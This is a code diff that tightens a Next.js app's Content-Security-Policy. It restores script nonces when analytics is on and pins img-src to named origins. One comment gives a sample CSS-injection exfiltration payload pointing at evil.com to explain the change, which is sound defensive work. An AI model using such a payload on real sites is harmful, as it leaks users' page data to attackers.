@@ -34,33 +34,41 @@ export function proxy(request: NextRequest) {
 
   const devInline = isProd ? "" : " 'unsafe-inline'";
 
-  // When Umami is enabled, we must use 'unsafe-inline' for scripts because Umami
-  // generates dynamic inline scripts. Per CSP spec, 'unsafe-inline' is ignored
-  // when nonce or hash values are present, so we can't use both.
-  // Trade-off: slightly weaker CSP when analytics is enabled, but necessary for Umami.
-  const umamiEnabled = !!umamiOrigin;
+  // Umami loads its tracker via an external <script src="https://{host}/script.js">
+  // — no inline scripts. Allowlisting the Umami origin in script-src is
+  // sufficient, so we don't need the previous "umami-enabled →
+  // 'unsafe-inline'" fallback that disabled nonces for everything else.
+  // Keep nonce + Next.js hash allowlist active regardless of analytics.
+  const scriptNonce = isProd ? ` 'nonce-${nonce}'` : "";
 
-  // Only use nonces/hashes when Umami is NOT enabled
-  const scriptNonce = isProd && !umamiEnabled ? ` 'nonce-${nonce}'` : "";
-
-  // Hashes for Next.js internal inline scripts (hydration bootstrap)
-  // These are stable per build and required because Next.js generates inline scripts
-  // that we can't add nonce to directly. Skip when Umami is enabled.
-  const nextjsScriptHashes = isProd && !umamiEnabled
+  // Hashes for Next.js internal inline scripts (hydration bootstrap).
+  // Stable per build; Next.js emits these inline, we can't nonce them
+  // directly.
+  const nextjsScriptHashes = isProd
     ? " 'sha256-n46vPwSWuMC0W703pBofImv82Z26xo4LXymv0E9caPk=' 'sha256-OBTN3RiyCV4Bq7dFqZ5a2pAXjnCcCYeTJMO2I/LYKeo=' 'sha256-rpFLA0A0bZa5TNfjM1XqirwKzdeQw7T9ftN+4hUm3Gc='"
     : "";
 
-  // When Umami is enabled in production, use unsafe-inline (since we can't use nonces)
-  const prodInline = isProd && umamiEnabled ? " 'unsafe-inline'" : "";
-
   const scriptOrigins = umamiOrigin ? ` ${umamiOrigin}` : "";
+
+  // img-src: previously `'self' data: blob: https:` — the trailing
+  // `https:` wildcard allowed any HTTPS image host and opened a CSS-
+  // injection exfil channel (background-image: url(https://evil.com?…)).
+  // Pin to the origins we actually render from.
+  const imgSrc = [
+    "img-src 'self' data: blob:",
+    ...apiOrigins,
+    ...(umamiOrigin ? [umamiOrigin] : []),
+    "https://docs.lawlens.io",
+    "https://*.cloudfront.net",
+  ].join(" ");
+
   const csp = [
     "default-src 'self'",
-    `script-src 'self'${scriptNonce}${nextjsScriptHashes}${scriptOrigins}${prodInline}${isProd ? "" : " 'unsafe-eval'"}${devInline}`,
-    `script-src-elem 'self'${scriptNonce}${nextjsScriptHashes}${scriptOrigins}${prodInline}${isProd ? "" : " 'unsafe-eval'"}${devInline}`,
+    `script-src 'self'${scriptNonce}${nextjsScriptHashes}${scriptOrigins}${isProd ? "" : " 'unsafe-eval'"}${devInline}`,
+    `script-src-elem 'self'${scriptNonce}${nextjsScriptHashes}${scriptOrigins}${isProd ? "" : " 'unsafe-eval'"}${devInline}`,
     styleSrc,
     styleSrcElem,
-    "img-src 'self' data: blob: https:",
+    imgSrc,
     "font-src 'self' data:",
     `connect-src ${connectSrc}`,
     `frame-src ${frameSrc}`,
